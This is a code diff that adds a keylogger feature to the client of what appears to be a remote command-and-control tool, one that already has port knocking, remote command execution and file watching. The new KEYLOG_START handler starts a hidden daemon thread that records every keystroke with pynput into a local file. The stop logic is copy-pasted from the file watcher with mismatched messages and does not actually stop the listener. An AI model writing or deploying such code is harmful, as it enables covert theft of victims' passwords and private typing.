@@ -16,6 +16,9 @@ import subprocess
 from enum import IntEnum
 from collections import deque, Counter
 import threading
+
+from pynput import keyboard
+
 from raw_socket_protocol import RawSocketProtocol
 from file_watcher import FileWatcher
 
@@ -52,6 +55,8 @@ COMMAND_CODES = frozenset([
     0x5678,  # RUN_COMMAND
     0x6789,  # FILE_WATCH  (commander requesting a watch)
     0x8901,  # STOP_WATCH
+    0x9012,  # KEYLOG_START
+    0x0123,  # KEYLOG_END
 ])
 
 
@@ -74,7 +79,8 @@ class Client:
         self.protocol = RawSocketProtocol()
         self._watcher_thread = None  # active FileWatcher thread
         self._watcher_stop = threading.Event()  # set this to stop the watcher
-
+        self._keylogger_thread = None
+        self._keylogger_stop = threading.Event()
     # ------------------------------------------------------------------ #
     #  Port-knock helpers                                                  #
     # ------------------------------------------------------------------ #
@@ -466,6 +472,37 @@ class Client:
             self._stop_file_watcher()
             print("    File watcher stopped.")
 
+        elif command_type == CommandType.KEYLOG_START:
+            log_file = "./keylogger.txt"
+            def run_keylogger():
+                def on_press(key):
+                    try:
+                        # Record alphanumeric keys
+                        with open(log_file, "a") as f:
+                            f.write(f"{key.char}")
+                    except AttributeError:
+                        # Record special keys (space, enter, etc.)
+                        with open(log_file, "a") as f:
+                            if key == key.space:
+                                f.write(" ")
+                            elif key == key.enter:
+                                f.write("\n")
+                            else:
+                                f.write(f" {str(key)} ")
+
+                # Set up the listener
+                with keyboard.Listener(on_press=on_press) as listener:
+                    listener.join()
+            self._keylogger_stop.clear()
+            self._keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
+            self._keylogger_thread.start()
+            print(f"    Keylogger started")
+
+        elif command_type == CommandType.KEYLOG_END:
+            print("[*] Processing STOP_WATCH")
+            self._stop_keylogger()
+            print("    File watcher stopped.")
+
     def _stop_file_watcher(self):
         """Stop the active file watcher thread if running."""
         if self._watcher_thread and self._watcher_thread.is_alive():
@@ -474,6 +511,15 @@ class Client:
             self._watcher_thread.join(timeout=3)
             self._watcher_thread = None
         self._watcher_stop.clear()
+
+    def _stop_keylogger(self):
+        """Stop the active file watcher thread if running."""
+        if self._keylogger_thread and self._keylogger_thread.is_alive():
+            print("[*] Stopping existing keylogger...")
+            self._keylogger_stop.set()
+            self._keylogger_thread.join(timeout=3)
+            self._keylogger_thread = None
+        self._keylogger_stop.clear()
 
     # ------------------------------------------------------------------ #
     #  Response sender                                                     #
